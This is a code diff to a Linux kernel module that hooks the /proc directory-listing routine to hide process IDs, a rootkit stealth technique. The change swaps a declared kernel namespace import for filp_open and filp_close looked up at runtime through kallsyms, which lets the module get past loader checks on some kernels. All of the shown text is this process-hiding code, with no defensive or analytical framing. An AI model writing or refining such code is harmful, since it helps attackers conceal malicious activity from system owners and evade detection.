@@ -12,7 +12,6 @@
 #include <linux/proc_fs.h>
 #include <linux/seq_file.h>
 #include <linux/rcupdate.h>
-#include <linux/kallsyms.h>
 
 /* One filldir actor for every kernel: int (pre-6.1) vs bool (6.1+) only
  * differ in type, not ABI — 0/continue and 1/stop share the same w0
@@ -26,10 +25,8 @@ typedef int hide_filldir_ret_t;
 #include <linux/atomic.h>
 #include <linux/rculist.h>
 
-/* filp_open lives in a gated namespace; import it explicitly (any module
- * may, it just has to say so). Without this the loader rejects the
- * module (EINVAL), even though the symbol exists. */
-MODULE_IMPORT_NS(VFS_internal_I_am_really_a_filesystem_and_am_NOT_a_driver);
+/* filp_open/filp_close resolved at runtime via kallsyms (memd_utils.c).
+ * No VFS namespace import needed — avoids loader rejection on some kernels. */
 
 /* VFS readdir hook for /proc pid hiding.
  *
@@ -159,12 +156,13 @@ static int hook_proc_dir(const char *path)
     if (hooked_fops_count >= MAX_HOOKED_OPS)
         return -ENOSPC;
 
-    f = filp_open(path, O_RDONLY | O_DIRECTORY, 0);
+    if (memd_filp_open(path, O_RDONLY | O_DIRECTORY, 0, &f) != 0)
+        return -ENOSPC;
     if (IS_ERR(f))
         return PTR_ERR(f);
 
     ops = memd_file_fop(f);
-    filp_close(f, NULL);
+    memd_filp_close(&f, NULL);
     if (!ops || !memd_iter_get(ops)) {
         memd_err("hide install: no f_op/iterate for %s\n", path);
         return -ENOSYS;
